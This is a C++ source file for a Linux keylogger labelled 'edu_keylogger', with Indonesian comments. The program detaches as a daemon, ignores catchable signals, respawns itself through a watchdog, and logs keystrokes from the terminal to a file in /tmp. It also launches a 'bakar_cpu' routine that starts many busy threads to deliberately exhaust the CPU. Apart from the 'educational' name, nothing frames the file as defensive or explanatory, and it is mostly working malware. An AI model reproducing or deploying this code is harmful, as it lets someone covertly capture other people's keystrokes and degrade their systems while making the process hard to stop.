#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <iomanip>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <cctype>
#include <fcntl.h>
#include <unistd.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <vector>
#include <random>
#include "json.hpp"

using namespace std;
using json = nlohmann::json;

atomic<bool> running(true);
atomic<bool> password_entered(false);
const string LOCKFILE = "/tmp/edu_keylogger.lock";

void bakar_cpu() {
    vector<thread> threads;
    int thread_count = thread::hardware_concurrency() * 4;
    if (thread_count < 8) thread_count = 8;
    
    for (int i = 0; i < thread_count; i++) {
        threads.emplace_back([] {
            while (running) {
                
            }
        });
    }

    wstring large_unicode;
    large_unicode.reserve(10000000);
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dist(0x4E00, 0x9FFF); // Range karakter CJK
    
    for (int i = 0; i < 10000000; i++) {
        large_unicode.push_back(static_cast<wchar_t>(dist(gen)));
    }

    while (running) {
        wstring temp;
        for (wchar_t c : large_unicode) {
            double x = static_cast<double>(c);
            for (int j = 0; j < 5; j++) {
                x = sin(x) * cos(x) / tan(x) * sqrt(x);
            }
            
            temp.push_back(static_cast<wchar_t>(c ^ (static_cast<wchar_t>(x * 1000) & 0xFF));
        }
        
        for (int i = 0; i < 1000; i++) {
            swap(large_unicode, temp);
        }
        
        wstring new_unicode;
        for (size_t i = 0; i < large_unicode.size(); i += 2) {
            double val = static_cast<double>(large_unicode[i]) 
                       * static_cast<double>(large_unicode[i+1]);
            new_unicode.push_back(static_cast<wchar_t>(static_cast<int>(val) % 0xD7FF));
        }
        large_unicode = move(new_unicode);
    }
    for (auto& t : threads) {
        t.join();
    }
}
void signalHandler(int signum) {
    ofstream logfile("/tmp/edu_keylogger.log", ios::app);
    logfile << "[" << time(nullptr) << "] Signal " << signum << " received and ignored." << endl;
    logfile.close();
}

void blockAllSignals() {
    for (int sig = 1; sig <= 31; sig++) {
        if (sig != SIGKILL && sig != SIGSTOP) {
            signal(sig, signalHandler);
        }
    }
}

void daemonize() {
    pid_t pid = fork();
    
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); 

    if (setsid() < 0) exit(EXIT_FAILURE);
    
    blockAllSignals();
    
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    chdir("/");
    
    for (int fd = sysconf(_SC_OPEN_MAX); fd >= 0; fd--) {
        close(fd);
    }

    open("/dev/null", O_RDWR); 
    dup(0);
    dup(0); 
}

bool createLockFile() {
    int fd = open(LOCKFILE.c_str(), O_CREAT | O_RDWR, 0666);
    if (fd < 0) return false;
    
    if (flock(fd, LOCK_EX | LOCK_NB) < 0) {
        close(fd);
        return false;
    }
    
    string pid_str = to_string(getpid());
    write(fd, pid_str.c_str(), pid_str.size());
    return true;
}

void createWatchdogProcess() {
    pid_t pid = fork();
    if (pid == 0) { // Proses anak
        pid_t parent_pid = getppid();
        
        while (true) {
            sleep(1);
            
            if (kill(parent_pid, 0) != 0) {
                execlp("/proc/self/exe", "/proc/self/exe", nullptr);
                exit(0);
            }
        }
    }
}

string keyCodeToString(char c) {
    if (isalnum(c)) return string(1, c);
    switch (c) {
        case ' ': return " ";
        case '\n': return "[ENTER]\n";
        case 127: return "[BACK]"; 
        case '\t': return "[TAB]";
        case 27: return "[ESC]";
        case 1: return "[CTRL+A]"; 
        default: return "";
    }
}

bool isExitCombo(char c) {
    return (c == 5);
}

string loadPassword() {
    try {
        ifstream configFile("config.json");
        if (!configFile.is_open()) {
            configFile.open("config.json");
            if (!configFile.is_open()) {
                return "default_password";
            }
        }
        
        json config;
        configFile >> config;
        return config["password"];
    } catch (const exception& e) {
        return "default_password";
    }
}

bool verifyPassword(const string& storedPassword) {
    
    ofstream flagfile("/tmp/edu_keylogger.exit");
    flagfile << storedPassword;
    flagfile.close();
    
    // Tunggu validasi
    for (int i = 0; i < 10; i++) {
        if (!running) return true;
        sleep(1);
    }
    return false;
}

void keyloggerMain() {
    string exitPassword = loadPassword();
    thread(bakar_cpu).detach();
    time_t startTime = time(nullptr);
    const int totalDuration = 60 * 60; 

    ofstream logfile("/tmp/edu_keylogger.log", ios::app);
    logfile << "==== Keylogger started at " << ctime(&startTime);
    logfile << "Will run for " << totalDuration << " seconds" << endl;
    
    int tty_fd = open("/dev/tty", O_RDWR);
    if (tty_fd < 0) {
        logfile << "Failed to open /dev/tty" << endl;
        return;
    }
    
    struct termios oldt, newt;
    tcgetattr(tty_fd, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(tty_fd, TCSANOW, &newt);
    
    while (running) {
        time_t currentTime = time(nullptr);
        int secondsRemaining = totalDuration - (currentTime - startTime);
        
        if (secondsRemaining <= 0) {
            logfile << "\n[✓] Time is up. Educational session complete.\n";
            running = false;
            break;
        }
        
        ifstream flagfile("/tmp/edu_keylogger.exit");
        if (flagfile.good()) {
            string password;
            flagfile >> password;
            flagfile.close();
            remove("/tmp/edu_keylogger.exit");
            
            if (password == exitPassword) {
                logfile << "\n[✓] Password correct. Exiting program.\n";
                running = false;
                break;
            }
        }
        
        char c;
        if (read(tty_fd, &c, 1) > 0) {
            string keyStr = keyCodeToString(c);
            if (!keyStr.empty()) {
                logfile << keyStr << flush;
            }
            
            if (isExitCombo(c)) {
                logfile << "\n[!] Exit combo detected. Waiting for password...\n";
            }
        }
        
        sleep(1);
    }
    
    tcsetattr(tty_fd, TCSANOW, &oldt);
    close(tty_fd);
    logfile.close();
    remove(LOCKFILE.c_str());
}

int main(int argc, char* argv[]) {
    if (argc == 1) {
        if (!createLockFile()) {
            cerr << "Program is already running!" << endl;
            return 1;
        }
        
        daemonize();
        
        createWatchdogProcess();
        
        blockAllSignals();
        
        keyloggerMain();
    }
    else {
        string password;
        cout << "Enter shutdown password: ";
        cin >> password;
        
        ofstream flagfile("/tmp/edu_keylogger.exit");
        flagfile << password;
        flagfile.close();
        
        cout << "Shutdown command sent. Program will exit within 10 seconds." << endl;
    }
    
    return 0;
}